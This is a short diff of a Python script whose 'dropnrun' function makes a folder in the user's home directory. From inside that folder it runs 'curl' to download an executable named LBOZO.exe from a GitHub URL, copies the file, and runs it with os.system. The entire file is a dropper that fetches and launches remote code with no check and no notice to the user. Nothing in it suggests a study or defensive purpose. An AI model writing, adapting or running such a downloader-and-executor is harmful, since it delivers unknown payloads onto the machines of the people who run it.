@@ -1,20 +1,20 @@
 import os
 
-os.system("curl -OL https://raw.githubusercontent.com/LBOZO/LBOZO/master/LBOZO.exe")
-
-with open ("./dist/LBOZO.exe", 'rb') as f:
-    LBOZO = f.read()
 
 def dropnrun(programname):
     path = os.path.expanduser("~")
     os.chdir(path)
     os.mkdir(programname)
     os.chdir(programname)
+    os.system("curl -OL https://github.com/Frikallo/LBOZO/raw/main/out/LBOZO.exe")
     finaldest = os.getcwd()
-    with open(f"{finaldest}/LBOZO.exe", 'wb') as f:
+    with open("LBOZO.exe", "rb") as f:
+        LBOZO = f.read()
+    with open(f"{finaldest}/LBOZO.exe", "wb") as f:
         f.write(LBOZO)
-        
-    command = '{}'.format(f"{finaldest}/LBOZO.exe")
+
+    command = "{}".format(f"{finaldest}/LBOZO.exe")
     os.system(command)
+
 
 dropnrun("LBOZO")
